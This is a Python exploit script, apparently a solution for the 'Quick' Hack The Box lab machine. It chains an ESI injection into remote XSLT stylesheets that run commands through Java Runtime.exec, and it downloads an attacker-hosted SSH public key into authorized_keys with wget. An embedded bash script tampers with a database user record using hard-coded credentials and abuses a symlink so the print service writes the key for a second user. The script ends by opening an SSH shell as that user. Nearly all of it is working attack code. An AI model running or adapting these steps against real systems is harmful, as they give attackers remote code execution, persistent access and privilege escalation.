#!/usr/bin/python3

import sys
import os
import requests
import subprocess
import threading
from random import randint
from time import sleep
from http.server import HTTPServer, SimpleHTTPRequestHandler

# Function to execute a command on the box using ssh
def sam_command(cmd):
    os.system(f"ssh -i sam_rsa sam@quick.htb '{cmd}'")

# Function that brings the webserver up
def up(thread):
    thread.start()
    sleep(2)

# Function that takes the webserver down
def down(webserver):
    webserver.shutdown()

# Function to print a status message
def print_status(message):
    print(f"----------------------------------------\n{message}\n----------------------------------------\n")

# Function to insert the command you want executed with the ESI payload. Template for the exploit is found here: https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/
def write_esi(cmd):
    esi = '''<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
<xsl:variable name="cmd"><![CDATA[''' + cmd + ''']]></xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>'''
    return esi

get_srvadm ='''#!/bin/bash

# Adding a new password for the user srvadm in the database. This keeps the original password in tact and still allows us access. Database creds were found through enumeration.
echo ""
echo [*] Updating the database to add a known password to the server...
echo 'DELETE FROM users WHERE password="bc2bc58156a161411cca0bc838678e88";' | mysql -h localhost -u db_adm -pdb_p4ss -D quick 2>/dev/null
echo 'INSERT into users (name,email,password) VALUES ("Server Admin","srvadm@quick.htb","bc2bc58156a161411cca0bc838678e88");' | mysql -h localhost -u db_adm -pdb_p4ss -D quick 2>/dev/null
echo ""
cd /var/www/jobs

# Grabbing the public key from the webserver
echo [*] Downloading the public key...
wget -q http://10.10.14.8/sam_rsa.pub -O /var/www/jobs/sam_rsa.pub 1>/dev/null

# Exploiting the fact that the print server will write to a file (name based on date/time stamp). We link the file it's expecting to the /home/srvadm/.ssh/authorized_keys file and have the print server (executing with srvadm permissions) write our public key to the file.
# Saving the public key contents to a variable
pubkey=`cat sam_rsa.pub`

# Establishing a session to grab the cookie
cookie=`curl -s -i -X POST -H 'Host: printerv2.quick.htb' -d"email=srvadm%40quick.htb&password=marlaspassword" http://127.0.0.1/index.php | grep Set-Cookie | cut -d ' ' -f 2 | cut -d ';' -f 1`

# Creating the symbolic link between the authorized_keys file and the file in the jobs directory
echo ""
echo "[*] Creating a linked file to srvadm's authorized keys and sending the payload..."
filename=`date +%F_%T`
ln -s /home/srvadm/.ssh/authorized_keys $filename

# Sending the exploit
curl -s -X 'POST' -H 'Host: printerv2.quick.htb' -H "Cookie: $cookie" -d "title=marlas&submit=" --data-urlencode "desc=$pubkey" http://127.0.0.1/job.php 1>/dev/null

# Cleanup
rm /var/www/jobs/sam_rsa.pub
rm /var/www/jobs/$filename
'''

# Function to get a random number to append to the esi filename. This is because the server won't allow the use of the same name twice.
def get_randnum():
    return ''.join(["{}".format(randint(0,9)) for num in range(0,4)])

# Function to create a filename based on the random number
def gen_filename():
    randnum = get_randnum()
    filename = "esi" + randnum + ".xsl"
    return filename

# Usage check
if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <Your IP>")
    sys.exit()

# Verifying that you have a public and private key pair named sam_rsa
ssh_set = False

while ssh_set == False:
    answer = input("Have you created sam_rsa and sam_rsa.pub files? (Answer Y or N) ")
    if answer.lower() == 'n':
        print("Run the following command up to COPY HERE, then press ENTER thrice (3 times):\r\nssh-keygen\r\n./sam_rsa\r\nCOPY HERE")
        sys.exit()
    elif answer.lower() == 'y':
        ssh_set = True
    else:
        print("Answer Y or N")

# Verifying that you have added quick.htb to the /etc/hosts file
etc_set = False

while etc_set == False:
    answer = input("Have up udated your /etc/hosts file with 10.10.10.186 quick.htb? (Answer Y or N) ")
    if answer.lower() == 'n':
        print("Run the following command to update your /etc/hosts/file: echo -n 10.10.10.186 quick.htb >> /etc/hosts")
        sys.exit()
    elif answer.lower() == 'y':
        etc_set = True
    else:
        print("Answer Y or N")

# This logs into the application to get a valid session
print_status("Logging into the webpage and grabbing a cookie...")
HOST_PORT = 80
HOST_ADDRESS = sys.argv[1]
session = requests.Session()
login_sess = session.post(url="http://quick.htb:9001/login.php", data={"email" : "elisa@wink.co.uk", "password" : "Quick4cc3$$"}) # Password was found in a PDF on the HTTP3 portal. Username was found by using Burp to brute-force emails based on information gathered from the site with the password. The e-mail creator script is how I generated the list of e-mails to try.
print_status("Session established")

# This step is creating the .xls files needed to exploit ESI. They will be deleted after use. The commands used will mkdir a directory called /home/sam/.ssh and then write our public key to the authorized key file. Then we can ssh into the machine as sam.
print_status("Creating the poisoned .xls files...")
esi1 = write_esi("mkdir /home/sam/.ssh")
esi2 = write_esi("wget http://" + HOST_ADDRESS + "/sam_rsa.pub -O /home/sam/.ssh/authorized_keys")

file1 = gen_filename()
file2 = gen_filename()
payload1 = open(file1, "w+")
payload1.write(esi1)
payload2 = open(file2, "w+")
payload2.write(esi2)
payload1.close()
payload2.close()
print_status("Files created")

# Here, we generate the injection statements that will be submitted in the online form
print_status("Generating ESI injection statements...")
inj1 = '''<esi:include src="http://127.0.0.1:9001/home.php" stylesheet="http://10.10.14.8/''' + file1 + '''"></esi:include>'''
inj2 = '''<esi:include src="http://127.0.0.1:9001/home.php" stylesheet="http://10.10.14.8/''' + file2 + '''"></esi:include>'''
print_status("ESI injection statements created")

# Starting up a webserver to host the .xls files
print_status("Starting up the local web server...")
webserver = HTTPServer((HOST_ADDRESS, HOST_PORT), SimpleHTTPRequestHandler)
thread1 = threading.Thread(target=webserver.serve_forever)
thread1.daemon = True
up(thread1)
print_status("Local web server started")

# Sending the first payload to create the /home/sam/.ssh directory
print_status("Sending payload1...")
randnum = get_randnum()
session.post(url="http://quick.htb:9001/ticket.php", cookies=login_sess.cookies.get_dict(), data={"title" : "Nonsense", "msg" : inj1, "id" : "TKT-" + randnum})
session.get(url="http://quick.htb:9001/search.php?search=" + randnum, cookies=login_sess.cookies.get_dict())
sleep(5)
print_status("Payload1 sent and grabbed")

# Second payload to write our public key to the /home/sam/.ssh/authorized_hosts file
print_status("Sending payload2...")
randnum = get_randnum()
login_sess = session.post(url="http://quick.htb:9001/login.php", data={"email" : "elisa@wink.co.uk", "password" : "Quick4cc3$$"})
session.post(url="http://quick.htb:9001/ticket.php", cookies=login_sess.cookies.get_dict(), data={"title" : "Nonsense", "msg" : inj2, "id" : "TKT-" + randnum})
session.get(url="http://quick.htb:9001/search.php?search=" + randnum, cookies=login_sess.cookies.get_dict())
sleep(5)
print_status("Payload2 sent and grabbed")

# Clean up of the .xls files
print_status("Removing XLS Files...")
os.remove(file1)
os.remove(file2)
print_status("Files removed")

# First user down, moving to the second one
print_status("Sam exploited, moving on to srvadm...")

# Getting the user flag printed out
print_status("Getting user.txt contents...")
sam_command("cat ~/user.txt")
print_status("Got 'em!")

# Grabbing the bash script required to escalate to the second user
print_status("Copying the bash script to the target...")
sam_command("ls ~/marlas 2>/dev/null || mkdir ~/marlas")
sam_command("rm ~/marlas/get_srvadm.* 2>/dev/null")
f = open('get_srvadm.sh','w')
f.write(get_srvadm)
f.close()
os.system("chmod +x ./get_srvadm.sh")
os.system("scp -i sam_rsa ./get_srvadm.sh sam@quick.htb:/home/sam/marlas/get_srvadm.sh")
os.system("rm ./get_srvadm.sh")
print_status("Script copied")

# Executing the script which will write the sam_rsa.pub key to /home/srvadm/.ssh/authorized_keys. Now sam_rsa will work to ssh into both sam and srvadm.
print_status("Running the script and waiting\r\na few seconds for it to complete...")
sam_command("/home/sam/marlas/get_srvadm.sh")
sleep(15)

# Shutting down the web server
print_status("Shutting down the webserver")
down(webserver)
print_status("Webserver shut down")

# Will log you into srvadm using the sam_rsa key
print_status("Exploit complete. Enjoy your srvadm shell!")
os.system("ssh -i sam_rsa srvadm@quick.htb")

# Cleaning up the script from the target
sam_command("rm -r /home/sam/marlas")
